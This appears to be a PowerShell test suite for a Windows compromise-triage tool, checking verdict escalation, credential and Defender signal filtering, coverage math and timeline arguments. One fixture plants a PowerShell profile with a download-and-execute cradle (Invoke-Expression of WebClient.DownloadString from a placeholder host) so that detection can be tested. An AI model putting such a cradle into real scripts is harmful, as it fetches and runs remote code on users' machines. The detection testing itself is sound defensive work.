# test_v264.ps1 - truth pack v2: escalation gate (>=3 distinct weight-2s) + stored-WiFi demotion
#                  + Task 2 signal quality fixes A3 (PS-profile skeletons) A4 (dateless Defender
#                  remnant) A5 (EcsConfigs-only 5007 hunt FP) A6 (lone sub-8 HIGH process)
#                  + Task 3: A7 coverage as honest fraction (N/M sources) + A8 clean-check
#                  predicate alignment + riders (storm-gate fixture, inert Detail read drop)
$ErrorActionPreference = 'Stop'
$repo = Split-Path -Parent $PSScriptRoot
$src = Get-Content -LiteralPath (Join-Path $repo 'Ophira.ps1') -Raw
$pass = 0; $fail = 0
function Check([string]$label, [bool]$ok) {
    if ($ok) { $script:pass++; Write-Host "  [ok] $label" -ForegroundColor Green }
    else { $script:fail++; Write-Host "  [FAIL] $label" -ForegroundColor Red }
}

# ---- behavioral: Get-CompromiseVerdict - escalation gate + credential signal input ----
foreach ($n in 'Get-CompromiseVerdict', 'Get-LvlRank') {
    $m = [regex]::Match($src, "(?s)function $n \{.*?\r?\n\}")
    if (-not $m.Success) { throw "$n extract failed" }
    Invoke-Expression $m.Value
}
$tmp = Join-Path $env:TEMP ("ophira_v264_" + (Get-Date -Format 'HHmmss'))
New-Item -ItemType Directory -Path (Join-Path $tmp 'raw\evtx') -Force | Out-Null
$RawDir = Join-Path $tmp 'raw'
$MemDir = Join-Path $tmp 'mem'
$CaseDir = $tmp
$global:LogHours = 168
$script:EndpointAdmin = $true

function Import-CaseCsv([string]$name) { if ($script:fixtureRows.ContainsKey($name)) { return $script:fixtureRows[$name] }; return @() }
function Test-CaseCsv([string]$n) { return ($script:presentCsvs -contains $n) }
function Get-DotNetRelease { return 'net4 present' }
function Get-ToolsDir { return $null }
function Test-IsAdmin { return $false }

$script:presentCsvs = @()
$script:fixtureRows = @{}

# fixture rows for one distinct weight-2 signal each
$w2Defender = @([pscustomobject]@{ ThreatName = 'Trojan:Win32/Fresh'; SeverityID = 4; Source = 'live-catalog'; DetectedUTC = $null })
$w2Cred = @([pscustomobject]@{ Item = 'Auto-logon (Winlogon)'; Detail = 'user ''a'', cached password: PRESENT'; Risk = 'HIGH' })
$w2DnsIoc = @([pscustomobject]@{ Query = 'evil.example.com'; RemoteIp = '203.0.113.5' })
$w2Malfind = @([pscustomobject]@{ Process = 'evil'; PID = '4242' })
$w2Asep = @([pscustomobject]@{ Category = 'IFEO'; Name = 'evil.exe'; Value = 'debugger'; Flags = 'user-path' })
$w3Usn = @([pscustomobject]@{ WindowStart = '2026-10-14 18:00:00'; WriteEvents = '5000'; DistinctFiles = '900'; RansomExt = '' })

# scenario 1: THE regression pin - 2 distinct weight-2 signals, zero weight>=3 -> SUSPICIOUS (2)
# (the brief's "5 w2 -> rank 2" is a drafting slip: the -ge 3 gate is monotonic and the
# controller ruling itself says 4 w2 still escalates post-Task-1; the FP being fixed is the
# TWO-weak-weight-2 escalation, so that is the pin)
$script:fixtureRows = @{
    'defender_threats' = $w2Defender
    'credential_sweep' = $w2Cred
}
$v1a = Get-CompromiseVerdict
$nStrong1a = @($v1a.Signals | Where-Object { $_.Weight -ge 2 }).Count
Check "2x weight-2 fixture really produced 2 strong signals, no weight-3+" ($nStrong1a -eq 2 -and -not @($v1a.Signals | Where-Object { $_.Weight -ge 3 }).Count)
Check "REGRESSION PIN: 2 distinct weight-2s, zero weight-3+ -> rank 2 SUSPICIOUS (old gate escalated any 2 to rank 3)" ($v1a.LevelRank -eq 2)

# scenario 1b: exact live-case shape - 5 distinct weight-2s, zero weight>=3. Per the controller
# sequencing ruling this STILL escalates to rank 3 after Task 1 alone (4-5 >= 3); Task 2 demotes
# the remaining weak weight-2s. This pins the exact-shape behavior so the ruling stays visible.
$script:fixtureRows = @{
    'defender_threats' = $w2Defender
    'credential_sweep' = $w2Cred
    'ioc_hits_dns'     = $w2DnsIoc
    'memory_malfind'   = $w2Malfind
    'asep_sweep'       = $w2Asep
}
$v1 = Get-CompromiseVerdict
$nStrong = @($v1.Signals | Where-Object { $_.Weight -ge 2 }).Count
Check "5x weight-2 fixture really produced 5 strong signals, no weight-3+" ($nStrong -eq 5 -and -not @($v1.Signals | Where-Object { $_.Weight -ge 3 }).Count)
Check "exact live-case shape: 5 distinct weight-2s -> rank 3 until Task 2 demotes them (sequencing ruling)" ($v1.LevelRank -eq 3)

# scenario 2: 3 distinct weight-2s, zero weight>=3 -> still escalates to 3
$script:fixtureRows = @{
    'defender_threats' = $w2Defender
    'credential_sweep' = $w2Cred
    'ioc_hits_dns'     = $w2DnsIoc
}
$v2 = Get-CompromiseVerdict
Check "3 distinct weight-2s, zero weight-3+ -> rank 3 LIKELY COMPROMISED (escalation bar still real)" ($v2.LevelRank -eq 3)

# scenario 3: 2 distinct weight-2s + one weight-3 -> rank 3 (strong signal alone carries it)
$script:fixtureRows = @{
    'defender_threats'  = $w2Defender
    'credential_sweep'  = $w2Cred
    'usn_write_bursts'  = $w3Usn
}
$v3 = Get-CompromiseVerdict
Check "2 weight-2s + one weight-3 -> rank 3 (floor-3 signal drives level)" ($v3.LevelRank -eq 3)

# scenario 4: stored WiFi graded MEDIUM must NOT feed the credential signal (demotion pin)
$script:fixtureRows = @{
    'credential_sweep' = @([pscustomobject]@{ Item = 'WLAN profile ''alo'''; Detail = 'auth WPA3-Personal, key CAPTURED -> raw\wifi'; Risk = 'MEDIUM' })
}
$v4 = Get-CompromiseVerdict
Check "WiFi Risk MEDIUM row -> 'Credential material exposure' signal absent (was med|high match)" (@($v4.Signals | Where-Object { $_.Signal -eq 'Credential material exposure' }).Count -eq 0)

# scenario 5: LOW WiFi stays absent, autologon HIGH still fires with Item: Detail
$script:fixtureRows = @{
    'credential_sweep' = @(
        [pscustomobject]@{ Item = 'WLAN profile ''alo'''; Detail = 'auth WPA3-Personal, key CAPTURED -> raw\wifi'; Risk = 'LOW' }
        [pscustomobject]@{ Item = 'Auto-logon (Winlogon)'; Detail = 'user ''a'', cached password: PRESENT'; Risk = 'HIGH' }
    )
}
$v5 = Get-CompromiseVerdict
$cred5 = @($v5.Signals | Where-Object { $_.Signal -eq 'Credential material exposure' })
Check "WiFi Risk LOW row + autologon HIGH row -> signal fires once, count 1" ($cred5.Count -eq 1 -and $cred5[0].Count -eq 1)
Check "credential signal detail carries Item: Detail from the HIGH row only" ($cred5[0].Detail -match 'Auto-logon \(Winlogon\): user ''a''' -and $cred5[0].Detail -notmatch 'WLAN')

# scenario 6: no-signal case unchanged - rank 1 at coverage >= 40
$script:fixtureRows = @{}
# v2.64: coverage is now an honest fraction (collected weight / total possible weight, 166
# across the 29 Add-Cov entries) - the rank-0->1 floor still needs >= 40%, so the fixture
# collects 4 sources + the evtx export dir (69/166 -> 42%)
$script:presentCsvs = @('flash_process_scored', 'hayabusa_timeline', 'autoruns_runkeys', 'amcache')
$v6 = Get-CompromiseVerdict
$script:presentCsvs = @()
Check "coverage/rank-1 unchanged: no signals + coverage >= 40 -> rank 1" ($v6.LevelRank -eq 1)

# ---- A3: module 2.6 PsProfile skeleton gate + basename dedupe ----
foreach ($n in 'Test-IsUserWritablePath', 'Get-UserProfileList') {
    $m = [regex]::Match($src, "(?s)function $n \{.*?\r?\n\}")
    if (-not $m.Success) { throw "$n extract failed" }
    Invoke-Expression $m.Value
}
$m26 = [regex]::Match($src, "(?s)Id = '2\.6';.*?Run = \{(.*?)\r?\n        \} \}\r?\n    \[pscustomobject\]@\{ Id = '3\.1'")
if (-not $m26.Success) { throw 'module 2.6 extract failed' }
function Save-Rows { param([string]$Name, $Rows) $script:asepSaved[$Name] = $Rows }
function Write-CaseLog { param([string]$Message, [string]$Color = 'Gray') }
$script:asepSaved = @{}
# fake %SystemDrive% so the module's user walk only sees our fixture profiles
$fakeRoot = Join-Path $tmp 'sysdrive'
New-Item -ItemType Directory -Path (Join-Path $fakeRoot 'Users\skeletonuser\Documents\WindowsPowerShell') -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $fakeRoot 'Users\skeletonuser\Documents\PowerShell') -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $fakeRoot 'Users\eviluser\Documents\WindowsPowerShell') -Force | Out-Null
New-Item -ItemType Directory -Path (Join-Path $fakeRoot 'Users\biguser\Documents\PowerShell') -Force | Out-Null
Set-Content -LiteralPath (Join-Path $fakeRoot 'Users\skeletonuser\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1') -Value "# default skeleton profile" -Encoding ASCII
Set-Content -LiteralPath (Join-Path $fakeRoot 'Users\skeletonuser\Documents\PowerShell\Microsoft.PowerShell_profile.ps1') -Value "# default skeleton profile" -Encoding ASCII
Set-Content -LiteralPath (Join-Path $fakeRoot 'Users\eviluser\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1') -Value "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x/p.ps1')" -Encoding ASCII
Set-Content -LiteralPath (Join-Path $fakeRoot 'Users\biguser\Documents\PowerShell\profile.ps1') -Value ("# " + ('x' * 300)) -Encoding ASCII
$sdBak = $env:SystemDrive
try {
    $env:SystemDrive = $fakeRoot
    & ([scriptblock]::Create($m26.Groups[1].Value))
} finally { $env:SystemDrive = $sdBak }
$asepRows = @($script:asepSaved['asep_sweep'])
$skelRows = @($asepRows | Where-Object { $_.Category -eq 'PsProfile' -and "$($_.Location)" -match 'skeletonuser' })
Check "A3: two identical skeleton profiles dedupe to ONE row" ($skelRows.Count -eq 1)
Check "A3: deduped row Location notes BOTH WindowsPowerShell + PowerShell paths" ($skelRows.Count -eq 1 -and "$($skelRows[0].Location)" -match 'WindowsPowerShell' -and "$($skelRows[0].Location)" -match 'Documents\\PowerShell\\')
Check "A3: <=200-byte keyword-free profile carries NO user-path flag" ($skelRows.Count -eq 1 -and "$($skelRows[0].Flags)" -notmatch 'user-path')
$iexRows = @($asepRows | Where-Object { $_.Category -eq 'PsProfile' -and "$($_.Location)" -match 'eviluser' })
Check "A3: profile with Invoke-Expression keeps user-path" ($iexRows.Count -eq 1 -and "$($iexRows[0].Flags)" -match 'user-path')
$bigRows = @($asepRows | Where-Object { $_.Category -eq 'PsProfile' -and "$($_.Location)" -match 'biguser' })
Check "A3: large benign profile keeps user-path (size AND no-keywords is the gate)" ($bigRows.Count -eq 1 -and "$($bigRows[0].Flags)" -match 'user-path')

# ---- A4: Defender dateless inactive live-catalog remnant -> stale ----
# real merged row shape (module 6.1): ThreatName,SeverityID,IsActive,Resources,DetectedUTC,ResourcePath,Source
$script:fixtureRows = @{
    'defender_threats' = @([pscustomobject]@{ ThreatName = 'Trojan:Win32/Commando.A!ml'; SeverityID = '5'; IsActive = 'False'; Resources = ''; DetectedUTC = ''; ResourcePath = ''; Source = 'live-catalog' })
}
$vA4a = Get-CompromiseVerdict
Check "A4: dateless + inactive + empty-resources live-catalog row -> stale weight 1, no fresh signal" (@($vA4a.Signals | Where-Object { $_.Signal -eq 'Defender detection - active or in log window' }).Count -eq 0 -and @($vA4a.Signals | Where-Object { $_.Signal -like 'Defender detection - stale history*' -and $_.Weight -eq 1 -and $_.Count -eq 1 }).Count -eq 1)
$script:fixtureRows = @{
    'defender_threats' = @([pscustomobject]@{ ThreatName = 'PUA:Win32/LegacyCase'; SeverityID = '4' })
}
$vA4b = Get-CompromiseVerdict
Check "A4: genuinely schema-less row (no Source column) keeps the fresh default (weight 2)" (@($vA4b.Signals | Where-Object { $_.Signal -eq 'Defender detection - active or in log window' -and $_.Weight -eq 2 }).Count -eq 1)
$script:fixtureRows = @{
    'defender_threats' = @([pscustomobject]@{ ThreatName = 'Trojan:Win32/Active'; SeverityID = '5'; IsActive = 'True'; Resources = ''; DetectedUTC = ''; ResourcePath = ''; Source = 'live-catalog' })
}
$vA4c = Get-CompromiseVerdict
Check "A4: ACTIVE dateless live-catalog row stays fresh (weight 2)" (@($vA4c.Signals | Where-Object { $_.Signal -eq 'Defender detection - active or in log window' -and $_.Weight -eq 2 }).Count -eq 1)
$script:fixtureRows = @{
    'defender_threats' = @([pscustomobject]@{ ThreatName = 'Trojan:Win32/Dated'; SeverityID = '5'; IsActive = 'False'; Resources = 'foo.exe'; DetectedUTC = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'); ResourcePath = 'foo.exe'; Source = 'live-catalog' })
}
$vA4d = Get-CompromiseVerdict
Check "A4: dated inactive live-catalog row stays fresh (weight 2)" (@($vA4d.Signals | Where-Object { $_.Signal -eq 'Defender detection - active or in log window' -and $_.Weight -eq 2 }).Count -eq 1)

# ---- A5: EcsConfigs-only Defender 5007 hunt finding excluded from the verdict input ----
$huntEcs = @([pscustomobject]@{ Found = '2026-10-14T14:51:16Z'; Rule = 'Defender exclusion configuration changed'; Severity = 'high'; Entity = 'HOST'; Attck = 'T1562.001'; Evidence = '10/14/2026 3:40:55 AM: Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware. Old value: New value: HKLM\SOFTWARE\Microsoft\Windows Defender\Features\EcsConfigs\MpFC_Nis_WdFilterProcessExclusions = 0x1' })
$huntReal = @([pscustomobject]@{ Found = '2026-10-14T14:51:16Z'; Rule = 'Defender exclusion configuration changed'; Severity = 'high'; Entity = 'HOST'; Attck = 'T1562.001'; Evidence = '10/14/2026 3:40:55 AM: Exclusions\Paths changed to C:\tools' })
$huntOther = @([pscustomobject]@{ Found = '2026-10-14T14:51:16Z'; Rule = 'LSASS access'; Severity = 'high'; Entity = 'HOST'; Attck = 'T1003.001'; Evidence = 'lsass.exe handle requested' })
$script:fixtureRows = @{ 'hunt_findings' = $huntEcs }
$vA5a = Get-CompromiseVerdict
Check "A5: EcsConfigs-only 5007 finding + clean posture -> hunt signal NOT fed" (@($vA5a.Signals | Where-Object { $_.Signal -like 'Hunt technique*' }).Count -eq 0)
$script:fixtureRows = @{
    'hunt_findings' = $huntEcs
    'posture'       = @([pscustomobject]@{ Check = 'Defender exclusions'; Status = 'BAD'; Detail = '2 exclusion(s) configured - attackers add these; review: C:\tools' })
}
$vA5b = Get-CompromiseVerdict
Check "A5: same EcsConfigs finding + posture BAD exclusions row -> hunt signal counts it" (@($vA5b.Signals | Where-Object { $_.Signal -like 'Hunt technique*' -and $_.Count -eq 1 }).Count -eq 1)
$script:fixtureRows = @{ 'hunt_findings' = $huntReal }
$vA5c = Get-CompromiseVerdict
Check "A5: real non-EcsConfigs exclusion finding still counts" (@($vA5c.Signals | Where-Object { $_.Signal -like 'Hunt technique*' -and $_.Count -eq 1 }).Count -eq 1)
$script:fixtureRows = @{ 'hunt_findings' = @($huntEcs + $huntOther) }
$vA5d = Get-CompromiseVerdict
Check "A5: non-Defender hunt findings unaffected by the EcsConfigs exclusion" (@($vA5d.Signals | Where-Object { $_.Signal -like 'Hunt technique*' -and $_.Count -eq 1 }).Count -eq 1)

# ---- A6: lone sub-8 HIGH process demoted without corroboration ----
$a6proc = { param($score) @([pscustomobject]@{ PID = '3696'; Name = 'xray.exe'; Path = 'E:\Apps\v2rayN\bin\xray\xray.exe'; Score = $score; Verdict = 'HIGH'; Evidence = 'unsigned/no-company; public-conn:77.91.68.70'; Flags = 'NO-COMPANY'; Signer = '' }) }
$script:fixtureRows = @{ 'flash_process_scored' = & $a6proc '6' }
$vA6a = Get-CompromiseVerdict
$sa6a = @($vA6a.Signals | Where-Object { $_.Signal -eq 'Process anomaly verdict HIGH' })
Check "A6: solo HIGH score 6, no corroboration -> weight 1 with demote note in detail" ($sa6a.Count -eq 1 -and $sa6a[0].Weight -eq 1 -and $sa6a[0].Count -eq 1 -and "$($sa6a[0].Detail)" -match 'demoted')
$script:fixtureRows = @{ 'flash_process_scored' = & $a6proc '8' }
$vA6b = Get-CompromiseVerdict
Check "A6: HIGH score 8 solo -> weight 2" (@($vA6b.Signals | Where-Object { $_.Signal -eq 'Process anomaly verdict HIGH' -and $_.Weight -eq 2 -and $_.Count -eq 1 }).Count -eq 1)
$script:fixtureRows = @{
    'flash_process_scored' = & $a6proc '6'
    'yara_hits'            = @([pscustomobject]@{ Time = '2026-10-14 18:00:00'; Binary = 'xray.exe'; Rule = 'MALWARE_FAMILY_X'; Score = 'high'; Detail = 'yara match' })
}
$vA6c = Get-CompromiseVerdict
Check "A6: HIGH score 6 + YARA hit present -> corroborated, weight 2" (@($vA6c.Signals | Where-Object { $_.Signal -eq 'Process anomaly verdict HIGH' -and $_.Weight -eq 2 -and $_.Count -eq 1 }).Count -eq 1)

# ---- A7: coverage as an honest fraction (denominator = total possible weight, N/M sources) ----
# Add-Cov table: 29 entries, total possible weight 166. The raw\evtx dir created above always
# satisfies 'Event log export' (+20); IOC feeds/Sysmon/RAM are stubbed true below.
function Get-IocList { return @{ Hashes = @{ 'deadbeef' = $true }; Ips = @{}; Domains = @{}; Names = @{} } }
$Sysmon = $true
New-Item -ItemType Directory -Path $MemDir -Force | Out-Null
$allCovCsvs = @('flash_process_scored','flash_public_connections','autoruns_runkeys','hayabusa_timeline','amcache','prefetch_index','usn_write_bursts','mft_recent','asep_sweep','browser_files','defender_status','yara_scanned','sysmon_dns','entities_binaries','hunt_findings','svchost_audit','remote_access','security_proc_events','sysmon_remote_thread','security_kerberos','iis_requests','session_activity','wer_reports','loldrivers_hits')

# A7a: 8 sources uncovered -> 21/29 collected, 133/166 weight -> 80% (old capped sum said 100%)
$script:fixtureRows = @{}
$script:presentCsvs = @('flash_process_scored','autoruns_runkeys','hayabusa_timeline','amcache','prefetch_index','usn_write_bursts','asep_sweep','defender_status','yara_scanned','entities_binaries','hunt_findings','svchost_audit','remote_access','security_proc_events','wer_reports','loldrivers_hits')
$vA7a = Get-CompromiseVerdict
Check "A7: 8 sources uncovered -> coverage 80% (133/166 rounded), not the old capped 100%" ($vA7a.ConfidencePercent -eq 80 -and $vA7a.CoveragePercentUnadjusted -eq 80)
Check "A7: verdict object carries N/M sources (21/29)" ($vA7a.CoverageSourcesCollected -eq 21 -and $vA7a.CoverageSourcesTotal -eq 29)

# A7b: every source collected -> 100
$script:presentCsvs = $allCovCsvs
$vA7b = Get-CompromiseVerdict
Check "A7: all 29 sources collected -> 100%" ($vA7b.ConfidencePercent -eq 100 -and $vA7b.CoverageSourcesCollected -eq 29 -and $vA7b.CoverageSourcesTotal -eq 29)

# A7c: non-admin -15 applies to the collected sum BEFORE the division. The evtx export dir
# is set aside so tiny coverage is reachable (the stubs still give IOC 2 + Sysmon 5 + RAM 3).
Rename-Item -LiteralPath (Join-Path $RawDir 'evtx') 'evtx_away'
try {
    $script:EndpointAdmin = $false
    $script:presentCsvs = @('flash_process_scored')
    $vA7c = Get-CompromiseVerdict
    Check "A7: non-admin -15 applied to collected weight before division (22-15=7/166 -> 4%)" ($vA7c.ConfidencePercent -eq 4)

    # A7d: negative net weight clamps Confidence to 0 (14-15 < 0) and rank stays 0
    # (rank-0->1 floor untouched). v2.68 (B7): CoveragePercentUnadjusted is the PRE-correction
    # fraction - Round(100*14/166) = 8 - no longer the corrected value it wrongly mirrored.
    $script:presentCsvs = @('sysmon_dns')
    $vA7d = Get-CompromiseVerdict
    Check "A7: negative net weight clamps Confidence to 0 (14-15); Unadjusted is the pre-correction 8" ($vA7d.ConfidencePercent -eq 0 -and $vA7d.CoveragePercentUnadjusted -eq 8)
    Check "A7: coverage < 40% -> rank 0 (rank-0->1 floor unchanged by the fraction)" ($vA7d.LevelRank -eq 0)
} finally {
    Rename-Item -LiteralPath (Join-Path $RawDir 'evtx_away') 'evtx'
    $script:EndpointAdmin = $true
}
$script:presentCsvs = @()

# A7e: draft line - same rounded fraction + N/M sources, v2.55 wording verbatim (exact-string pin)
foreach ($n in 'Get-CaseNarrative') {
    $m = [regex]::Match($src, "(?s)function $n \{.*?\r?\n\}")
    if (-not $m.Success) { throw "$n extract failed" }
    Invoke-Expression $m.Value
}
$Computer = 'A7HOST'
$script:HostRole = 'Workstation'
$StartTime = Get-Date '2026-10-15 10:00'
$ScriptVersion = 'v264test'
$CsvDir = Join-Path $tmp 'csv'
$script:Verdict = $vA7a
$draftA7 = @(Get-CaseNarrative)
$assessA7 = @($draftA7 | Where-Object { $_ -like 'ASSESSMENT*' })[0]
Check "A7 draft line exact-string: same 80% fraction + 21/29 sources + v2.55 wording" ($assessA7 -eq 'ASSESSMENT: NO EVIDENCE OF COMPROMISE (evidence coverage 80% of expected sources - 21/29 sources, not a probability of compromise). No signs of compromise were found.')

# ---- A8: clean-check predicates align to the post-Task-1/2 verdict signal inputs ----
$m8 = [regex]::Match($src, "(?s)function Get-CleanCheckSummary \{.*?\r?\n\}")
if (-not $m8.Success) { throw 'Get-CleanCheckSummary extract failed' }
Invoke-Expression $m8.Value
function Get-Clean([string]$check) { @(@(Get-CleanCheckSummary) | Where-Object { "$($_.Check)" -eq $check }) } # NOTE: callers wrap in @() - single-row returns unroll (PS 5.1)

# A8-1 credential: verdict keys Risk -match '(?i)^high$' - the clean row must use the SAME filter
$script:fixtureRows = @{ 'credential_sweep' = @([pscustomobject]@{ Item = 'WLAN profile ''alo'''; Detail = 'key CAPTURED'; Risk = 'MEDIUM' }) }
$script:presentCsvs = @('credential_sweep')
Check "A8-1: MEDIUM-only credential CSV still shows the clean row" (@(Get-Clean 'Credential exposure sweep').Count -eq 1)
$script:fixtureRows = @{ 'credential_sweep' = @([pscustomobject]@{ Item = 'Auto-logon'; Detail = 'cached password: PRESENT'; Risk = 'high' }) }
Check "A8-1: lowercase 'high' row suppresses the clean row (verdict-aligned ^high$ filter)" (@(Get-Clean 'Credential exposure sweep').Count -eq 0)

# A8-2 log integrity: verdict keys EventId 1102/104 with Meaning 'clear' fallback - same predicate
# (v2.80: 'stop' dropped - benign 6006 'Event logging STOPPED (shutdown)' is not a tamper event)
$script:fixtureRows = @{ 'logging_gaps' = @([pscustomobject]@{ Time = '2026-10-14 18:00'; EventId = '1102'; Meaning = 'Security audit log CLEARED'; Source = 'security_events'; Message = '' }) }
$script:presentCsvs = @('logging_gaps')
Check "A8-2: gap row EventId 1102 suppresses the Log-integrity clean row" (@(Get-Clean 'Log integrity').Count -eq 0)
$script:fixtureRows = @{ 'logging_gaps' = @([pscustomobject]@{ Time = ''; EventId = ''; Meaning = 'chronological gaps detected in evtx (see raw\analysis\evtx_gaps.txt)'; Source = 'chainsaw'; Message = '' }) }
Check "A8-2: plain gap row without tamper evidence keeps the Log-integrity clean row" (@(Get-Clean 'Log integrity').Count -eq 1)
$script:fixtureRows = @{ 'logging_gaps' = @([pscustomobject]@{ Time = ''; EventId = '6006'; Meaning = 'Event logging STOPPED (shutdown)'; Source = 'system_events'; Message = '' }) }
Check "A8-2: benign 6006 'STOPPED (shutdown)' row keeps the clean row (v2.80: stop is not tamper)" (@(Get-Clean 'Log integrity').Count -eq 1)

# A8-3 beacon: suppressed when BOTH Sysmon and DNS telemetry are absent (presence check, no live-probe)
$script:fixtureRows = @{}
$script:presentCsvs = @()
Check "A8-3: no Sysmon/DNS telemetry -> no Beacon-clean claim" (@(Get-Clean 'Beacon detection').Count -eq 0)
$script:presentCsvs = @('sysmon_dns')
Check "A8-3: DNS telemetry present, 0 candidates -> Beacon clean row renders" (@(Get-Clean 'Beacon detection').Count -eq 1)

# ---- rider 1: storm-gated single-rule Sigma high must NOT corroborate a solo score-6 HIGH ----
$stormHay = @(1..6 | ForEach-Object { [pscustomobject]@{ Timestamp = "2026-10-14 18:0$_`:00"; Level = 'high'; RuleTitle = 'Suspicious Proxy Process Activity'; Channel = 'Sec'; EventID = '4688' } })
$script:fixtureRows = @{
    'flash_process_scored' = & $a6proc '6'
    'hayabusa_timeline'    = $stormHay
}
$vR1 = Get-CompromiseVerdict
$sr1 = @($vR1.Signals | Where-Object { $_.Signal -eq 'Process anomaly verdict HIGH' })
Check "rider: 6 events from 1 high rule storm-gated (highFloor 0) - solo score-6 HIGH stays weight 1" ($sr1.Count -eq 1 -and $sr1[0].Weight -eq 1 -and $sr1[0].Count -eq 1 -and @($vR1.Signals | Where-Object { $_.Signal -like 'Sigma detection - high*' -and $_.Weight -gt 0 }).Count -eq 0)

# ---- Task 4 rider: pooled hayabusa window (worker-reachable Run blocks read $script:LogHours) ----
# The worker preamble seeds ONLY $script:LogHours (New-WorkerPreamble). Module 4.6's hours-offset
# branch read bare $LogHours - value-correct today only because dynamic scoping bridges the read
# to the seeded script var; the explicit $script: read is the same contract the v2.60 MFT fix and
# the 5.x modules already follow.
foreach ($n in 'Get-KitRoot', 'New-WorkerPreamble') {
    $m = [regex]::Match($src, "(?s)function $n \{.*?\r?\n\}")
    if (-not $m.Success) { throw "$n extract failed" }
    Invoke-Expression $m.Value
}
$sf = [regex]::Match($src, "(?s)\`$script:SharedFunctions = @\(.*?\r?\n\)").Value
Invoke-Expression $sf
foreach ($fn in $script:SharedFunctions) {
    $m = [regex]::Match($src, "(?s)function $fn \{.*?\r?\n\}")
    if ($m.Success) { Invoke-Expression $m.Value }
}
$wt = [regex]::Match($src, "(?s)\`$script:ModuleWorkerText = @'.*?'@").Value
Invoke-Expression $wt

$m46 = [regex]::Match($src, "(?s)Id = '4\.6';.*?Run = \{(.*?)\r?\n        \} \}")
if (-not $m46.Success) { throw 'module 4.6 Run extract failed' }
$hay46 = $m46.Groups[1].Value

$toolsDir = Join-Path $tmp 'tools'
New-Item -ItemType Directory -Path $toolsDir -Force | Out-Null
Set-Content -LiteralPath (Join-Path $toolsDir 'hayabusa.exe') -Value 'x' -Encoding ASCII
$capFile = Join-Path $tmp 'hay_args.txt'

# W1: REAL worker path - ModuleWorkerText + real preamble ($script:LogHours = 24 seeded),
# real extracted 4.6 Run text, Invoke-NativeTool/Get-ToolsDir overridden via the preamble tail
$global:LogHours = 24; $script:LogStartDT = $null; $script:LogEndDT = $null
$pre46 = (New-WorkerPreamble -WorkerLog (Join-Path $CaseDir 'w46.log')) + "function Get-ToolsDir { return '$toolsDir' } function Invoke-NativeTool { param([string]`$ExePath, [string[]]`$ToolArgs, [string]`$WorkingDirectory) Add-Content -LiteralPath '$capFile' -Value (`$ToolArgs -join ' ') -Encoding UTF8 } "
$ps = [powershell]::Create()
$null = $ps.AddScript($script:ModuleWorkerText).AddArgument($pre46).AddArgument(@{ Id = '4.6'; Name = 'pooled-window-smoke'; RunText = $hay46 })
$r46 = $ps.Invoke() | Select-Object -First 1
$ps.Dispose()
Check "worker 4.6: module ran without error" ($r46 -and -not $r46.Error)
$hayLine = ''
if (Test-Path $capFile) { $hayLine = [string]@(Get-Content -LiteralPath $capFile)[0] }
Check "worker 4.6: seeded script var 24 -> --time-offset 24h in the dfir-timeline args" ($hayLine -match '--time-offset' -and $hayLine -match '(^| )24h( |$)')
Remove-Item -LiteralPath $capFile -Force -ErrorAction SilentlyContinue

# I2/I3: inline (top-level, the way the real script sets the $LogHours param - same storage slot)
function Get-ToolsDir { return $toolsDir }
$script:hayArgsCap = New-Object System.Collections.Generic.List[string]
function Invoke-NativeTool { param([string]$ExePath, [string[]]$ToolArgs, [string]$WorkingDirectory) $script:hayArgsCap.Add(($ToolArgs -join ' ')) }

$LogHours = 24; $script:LogStartDT = $null; $script:LogEndDT = $null
$script:hayArgsCap.Clear()
& ([scriptblock]::Create($hay46))
Check "inline 4.6: hours mode still carries --time-offset 24h after the script-var switch" ($script:hayArgsCap[0] -match '--time-offset' -and $script:hayArgsCap[0] -match '(^| )24h( |$)')

$script:LogStartDT = [datetime]'2026-09-01 08:00'
$script:hayArgsCap.Clear()
& ([scriptblock]::Create($hay46))
Check "4.6: explicit LogStartDT -> --start-timeline wins, no --time-offset (precedence untouched)" ($script:hayArgsCap[0] -match '--start-timeline' -and $script:hayArgsCap[0] -match '2026-09-01 08:00:00' -and $script:hayArgsCap[0] -notmatch '--time-offset')
$script:LogStartDT = $null

# sweep guard: NO module Run block reads bare $LogHours - the single allowed shape is the
# v2.60 MFT dual read (script var primary, param fallback), which is value-identical in workers
$runBlocks = [regex]::Matches($src, '(?s)Run = \{(.*?)\r?\n        \} \}')
$dualRead = 'if ($script:LogHours -gt 0) { $script:LogHours } elseif ($LogHours -gt 0) { $LogHours }'
$badRuns = @($runBlocks | Where-Object { $_.Groups[1].Value -match '\$LogHours' -and $_.Groups[1].Value -notmatch [regex]::Escape($dualRead) })
Check "sweep: $($runBlocks.Count) module Run blocks scanned, no bare `$LogHours reads (v2.60 dual read excepted)" ($runBlocks.Count -gt 30 -and $badRuns.Count -eq 0)
Check "pooled window: worker preamble seeds `$script:LogHours from the case window" ($src -match [regex]::Escape('$script:LogHours = $($LogHours)'))

# ---- statics ----
Check "escalation gate: -ge 3 with v2.64 rationale comment" ($src -match [regex]::Escape('if ($rank -eq 2 -and $distinctStrong -ge 3) { $rank = 3 }') -and $src -match '# v2\.64: escalation to LIKELY needs >=3 distinct weight-2 signals')
Check "WiFi grading: stored key demoted to LOW (v2.64 rider: dead ternary collapsed)" ($src -match [regex]::Escape("Risk = 'LOW' }") -and $src -notmatch [regex]::Escape('if ($hasKey) { ''LOW'' } else { ''LOW'' }'))
Check "credential signal input: HIGH-only filter" ($src -match [regex]::Escape('Where-Object { "$($_.Risk)" -match ''(?i)^high$'' })'))
Check "A4 marker: dateless inactive live-catalog remnant gate present" ($src -match '# v2\.64: dateless inactive live-catalog remnant')
Check "A5 marker: EcsConfigs-only 5007 verdict-input exclusion present" ($src -match '# v2\.64: EcsConfigs-only')
Check "A6 marker: process-score honesty gate present" ($src -match '# v2\.64: score honesty')
Check "A7 marker: honest-fraction coverage block present" ($src -match '# v2\.64: coverage as an honest fraction' -and $src -match [regex]::Escape('if ($covTotal -gt 0)'))
